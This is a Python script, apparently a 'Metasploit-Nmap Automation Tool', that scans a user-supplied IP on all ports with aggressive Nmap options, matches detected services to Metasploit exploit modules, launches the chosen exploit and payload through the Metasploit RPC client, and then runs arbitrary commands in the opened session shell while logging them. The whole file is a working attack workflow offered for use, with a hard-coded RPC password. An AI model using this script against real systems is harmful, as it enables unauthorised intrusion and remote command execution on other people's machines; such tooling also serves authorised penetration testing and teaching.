from pymetasploit3.msfrpc import *
import nmap
import csv

print("------Welcome to Metasploit-Nmap Automation Tool!------")
print("\n")
print("Target Scanning using Nmap")
scanner = nmap.PortScanner()
ip_addr = input("Enter target IP address: ")
print("The IP you entered is: ", ip_addr)
type(ip_addr)
print("\n")
print("Nmap Version: ", scanner.nmap_version())
scanner.scan(ip_addr, '1-65535', '-T4 -v -sS -sV -sC -A -O')

print(scanner.scaninfo())
print("Ip Status: ", scanner[ip_addr].state())
print(scanner[ip_addr].all_protocols())
print("Open Ports: ", scanner[ip_addr]['tcp'].keys())

output=scanner.csv()
        	
l=list(output.split("\n"))

for i in range(len(l)):
	l[i]=l[i].split(";")

with open('output_nmap.csv','w') as f:
	writer=csv.writer(f)
	writer.writerows(l)

print("\n")
print("Detailed output is stored in a file called output_nmap.csv")
print("\n")

ex1=[]
ex2=[]
with open('output_nmap.csv', 'r') as read_obj:
    csv_reader = csv.reader(read_obj)
    list_of_rows = list(csv_reader)

for i in list_of_rows:
	for j in range(len(i)):
		if(j==7):
			if(i[j]!=""):
				ex1.append(i[j])
		
#print(ex1)

client = MsfRpcClient('kali',ssl=True)
ls=client.modules.exploits

print("The services running on the target machine are: ")
for i in range(1,len(ex1)):
	if ex1[i] is not None:
		print("{0}. {1}".format(i,ex1[i]))
		
print("\n")
		
choice=int(input("Enter the number of the service you wish to exploit: "))

l=ex1[choice].split(" ")
results=[[]]
for i in l:
	filter_object = filter(lambda a: i.lower() in a, ls)
	results.append(list(filter_object))

result=[]
for i in results:
	for j in i:
		result.append(j)

with open('exploits.txt', 'w+') as f:
    for items in result:
        f.write('%s\n' %items)

print("\n")	
# Convert the filter object to list
print("Available exploit modules is output in a file 'exploits.txt': ")
print("\n")

num=int(input("Enter the index of exploit you wanna use! List is 0-indexed: "))
print("\n")
print("You have selected ",result[num])
exploit = client.modules.use('exploit', result[num])
print("\n")

print("Possible targets: ")
print(exploit.targets)
print("\n")
num=int(input("Enter the target you wanna use! List is 0-indexed: "))
exploit.target = num

payloads=exploit.targetpayloads()
print("Supported payloads are: ")
print(payloads)

print("\n")
num=int(input("Enter the index of payload you wanna use! List is 0-indexed: "))
#exploit.execute(payload=payloads[num])
print("\n")
print("Possible options are: ")
print(exploit.options)

exploit['RHOSTS'] = ip_addr

ls1=exploit.missing_required
if(len(ls1)>0):
	print("The required options to set are: ")
	print(ls1)

print("\n")	
print("Executing...")
print(exploit.execute(payload=payloads[num]))

print("\n")
print("The sessions list: ")
print(client.sessions.list)
print("\n")

print("If a session is not created, try running the program again! It is possible that the exploit is not working.")
choice=input("Want to run the exploit again?(y/n): ")
if(choice.lower()=="y"):
	print(exploit.execute(payload=payloads[num]))
	print("The sessions list: ")
	print(client.sessions.list)

print("\n")
print("If a session is not created, try running the program again! It is possible that the exploit is not working.")
print("\n")

s=input("Enter session number: ")
shell = client.sessions.session(s)

file1 = open("logs.txt","w")
while(True):
	command=input("Enter the command you want to execute! ")
	shell.write(command)
	print("Output after executing :",command)
	output=shell.read()
	print(output)
	file1.write(command+"\n"+output+"\n\n")

file1.close()
